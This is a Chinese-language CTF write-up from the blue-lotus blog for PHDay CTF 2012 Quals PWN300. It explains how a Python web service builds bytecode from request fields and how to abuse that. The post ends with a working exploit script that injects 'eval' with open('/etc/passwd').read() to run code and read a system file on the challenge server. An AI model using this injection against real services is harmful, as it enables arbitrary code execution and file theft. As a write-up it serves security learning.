
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>PHDay CTF 2012 Quals PWN300 - blue-lotus</title>
  <meta name="author" content="blue-lotus">

  
  <meta name="description" content="这题是基于twisted框架的一个web服务，题目给了一个web.py和process.pyc，阅读web.py代码发现处理post请求的核心函数在process模块中。使用unpyc这个工具反编译process.pyc，得到如下代码： def create_function(name, &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.blue-lotus.net//phday-ctf-2012-quals-pwn300">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <div id="header-inner">
    <span class="first"><a href="/">blue-lotus</a></span>
    <span><a href="/about">about</a></span>
    <span class="last"><a href="/atom.xml" title="subscribe via RSS">rss</a></span>
  </div>
</hgroup>

</header>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">PHDay CTF 2012 Quals PWN300</h1>
    
    
      <p class="meta">
        








  


<time datetime="2012-12-17T00:00:00+08:00" pubdate data-updated="true">Dec 17<span>th</span>, 2012</time>
        
      </p>
    
  </header>


<div class="entry-content"><p>这题是基于twisted框架的一个web服务，题目给了一个web.py和process.pyc，阅读web.py代码发现处理post请求的核心函数在process模块中。使用unpyc这个工具反编译process.pyc，得到如下代码：<br />
<!--more--></p>

<p>def create_function(name, args_count, choice, actions, human):</p>

<pre><code>    def y():
        pass

    print "choice:", choice
    code = (('t' + choice) + '\x00d\x01\x00\x83\x01\x00S')
    consts = ((None,) + (human,))
    names = actions

    fun = [args_count,
     y.func_code.co_nlocals,
     y.func_code.co_stacksize,
     y.func_code.co_flags,
     code,
     consts,
     names,
     y.func_code.co_varnames,
     y.func_code.co_filename,
     name,
     y.func_code.co_firstlineno,
     y.func_code.co_lnotab]
    print fun
    y_code = types.CodeType(*fun)

    return types.FunctionType(y_code, y.func_globals, name)

def kill(name):
    return ('%s was killed' % name)

def arrest(name):
    return ('%s was arrested' % name)

def bankrupt(name):
    return ('%s was bankrupted' % name)

def process():
    actions = tuple(args['actions'])
    choice = args['choice'][0]
    human = args['human'][0]
    print create_function('myfunc', 0, choice, actions, human)()
</code></pre>

<p>这题涉及到Python对象内部结构的知识，包括Python字节码、PyObject和PyCodeObject对象的结构等知识，可以参考hellok找的资料<a href="http://kdr2.net/blog/pyc_format.html">PYC格式文件分析</a>。</p>

<p>阅读process代码发现，create_function函数将actions写入函数y()的co_names字段，将human合并上None写入co_consts字段，再将choice插入字节码中。我们可以在本地使用Python自带的反汇编工具包<a href="http://docs.python.org/2/library/dis.html">dis</a>查看函数y()被改成了什么样子。</p>

<p>先传入args:</p>

<pre><code>args = {'human': ["Kenny"], 'actions': ['kill', 'arrest', 'bankrupt'], 'choice': ['\x01']}
</code></pre>

<p>然后：</p>

<pre><code>dis.dis(create_function('myfunc', 0, choice, actions, human))
</code></pre>

<p>得到函数y()的字节码：</p>

<pre><code>  7           0 LOAD_GLOBAL              1 (arrest)
              3 LOAD_CONST               1 ('Kenny')
              6 CALL_FUNCTION            1
              9 RETURN_VALUE
</code></pre>

<p>这下就很容易理解为什么我们在网页上看到的是“Kenny was arrested”，传进去的actions实际上是供调用的函数符号表，human实际上就是作为arrest的参数（通过LOAD_CONST传入python的栈中），然后choice就是在函数符号表co_names（actions）中选择哪一个函数来执行。</p>

<p>如此一来，我们就知道怎么去执行任意想要的函数了，只需要把函数名方在names中，用choice去指向它，然后把参数放入human。最简单的方式是使用eval(“/etc/passwd”)的方式来获得flag。渗透脚本如下：</p>

<pre><code>url_ = "http://ctf.phdays.com:2137/"

def send(choice, actions, human):
    form = ""
    form += "human=" + human + "&amp;"
    for a in actions:
        form += "actions=" + a + "&amp;"
    form += "choice=" + choice

    resp = urllib2.urlopen(url = url_, data = form)
    content = resp.read()
    print content

if __name__ == "__main__":
    choice = "%01"
    actions = ["kill", "eval", "bankrupt"]
    human = "open('/etc/passwd').read()"
    send(choice, actions, human)
</code></pre>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">kelwin</span></span>

      








  


<time datetime="2012-12-17T00:00:00+08:00" pubdate data-updated="true">Dec 17<span>th</span>, 2012</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/phday-ctf-2012-quals-pwn200/" title="Previous Post: PHDay CTF 2012 Quals PWN200">&laquo; PHDay CTF 2012 Quals PWN200</a>
      
      
        <a class="basic-alignment right" href="/phday-ctf-2012-quals-bin100%e6%80%9d%e8%b7%af/" title="Next Post: PHDay CTF 2012 Quals BIN100思路">PHDay CTF 2012 Quals BIN100思路 &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/csaw-ctf-quals-2013-exp300-writeup/">CSAW CTF Quals 2013 Exploitation 300 Writeup</a>
      </li>
    
      <li class="post">
        <a href="/csaw-ctf-quals-2013-crypto500-writeup/">CSAW CTF Quals 2013 Crypto500 Writeup</a>
      </li>
    
      <li class="post">
        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
      </li>
    
      <li class="post">
        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - blue-lotus -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'bluelotus';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>











</body>
</html>
